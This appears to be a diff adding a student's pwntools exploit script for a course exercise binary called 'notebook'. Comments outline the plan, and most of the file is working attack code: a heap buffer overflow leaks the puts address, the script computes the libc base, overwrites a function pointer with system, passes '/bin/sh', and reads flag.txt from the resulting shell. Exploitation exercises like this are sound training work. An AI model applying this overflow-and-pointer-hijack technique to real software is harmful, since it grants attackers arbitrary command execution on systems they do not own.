@@ -1,0 +1,111 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./notebook", checksec=False)
+context.log_level = "error"
+
+# For the container:
+# I dont know why, but sometimes recv is "too fast" and does not clear the whole pipe
+# So if something gets "stuck" in pipe the whole programm does not work anymore.... yeah don't know how to fix this.
+# Looking forward to friday for a fix
+
+# Idea:
+# 1. Create simple Note
+# 2. Create printable Note (both smaller than 80 Bytes ==> both fast bins, same heap area)
+# 3. Overflow simple Note via change Note (bufferoverflow via read 160 bytes)
+# 4. Leak puts with it (140 Byte overflow and we get some bytes printet out of puts)
+# 5. Load libc and calculate offset via puts symbol
+# 6. Load system (and /bin/sh pointer)
+# 7. Write system at the addr where puts was (in the printable note struct; wanted to add the pointer to the shell at the same time, but that did not work; got an error where sh said it could not work with input xD)
+# 8. Write /bin/sh at printablenote text
+# 9. Call print printable note 
+# ==> it will call system with /bin/sh as a parameter
+# ==> because rdx will be called (where normally puts where; now system)
+# ==> in rdi (first reg; SYSTEM V Calling Convention) will be the text of printable note (but this ist /bin/sh)
+# PROFIT SHELL LETS GO 
+
+# Also sry that i only did one task this time
+# The Tasks are all looking very spicy and I will try my best on the other ones later this week
+# Was the whole last week ill so I could not work on PABE (and needed to work on my bachelor thesis this week/last weekend^^) ~ Spartak
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def main():
+    io = start()
+
+    # Just do the first few Calls to the Programm as described above
+    io.recv(timeout=0.1)
+    io.sendline(b'1')
+    io.recv(timeout=0.1)
+    io.sendline(b"Do you know the Story of Darth Pleguis the wise?")
+    io.recv(timeout=0.1)
+    io.sendline(b"2")
+    io.recv(timeout=0.1)
+    io.sendline(b"He was a jedi master")
+    io.recv(timeout=0.1)
+    io.sendline(b"1")
+    io.recv(timeout=0.1)
+    io.sendline(b"3")
+    io.recv(timeout=0.1)
+    io.sendline(b"0")
+    io.recv(timeout=0.1)
+    io.sendline(cyclic(143))
+    io.recv(timeout=0.1)
+    io.sendline(b"6")
+    io.recv(timeout=0.1)
+    io.sendline(b"0")
+    # Now we get the puts addr. leaked
+    temp = io.recv(timeout=0.1)[64:70]
+    temp += b"\x00\x00"
+    puts = u64(temp)
+
+    # get the base of LIBC + a few symbols
+    libc = ELF("/usr/lib/libc.so.6", checksec=False) 
+    libc.address = puts - libc.sym["puts"]
+
+    system = libc.sym['system']
+    #binsh = next(libc.search(b'/bin/sh')) OLD TRY, still wanted to share, that this apporch did not work (think offset was wrong in the old payload! and yeah i KNOW no commented out code in solution, but wanted to share my idea like in 7.)
+
+    # Wrapper + system overrides puts 
+    payload = cyclic(144)
+    payload += p64(system)
+
+    io.sendline(b"3")
+    io.recv(timeout=0.1)
+    io.sendline(b"0")
+    io.recv(timeout=0.1)
+    io.sendline(payload)
+    io.recv(timeout=0.5)
+    io.sendline(b"4")
+    io.recv(timeout=0.5)
+    io.sendline(b"0")
+    io.recv(timeout=0.5)
+    # Write /bin/sh into printablenote start text
+    io.sendline(b"/bin/sh")
+    io.recv(timeout=0.1)
+    io.sendline(b"6")
+    io.recv(timeout=0.1)
+    io.sendline(b"0")
+    io.recv(timeout=0.1)
+    # now we have a shell, so just gimmme the flag
+    io.sendline(b"cat flag.txt")
+    print(io.recv().decode('utf-8')[:-1])
+
+if __name__ == "__main__":
+    main()
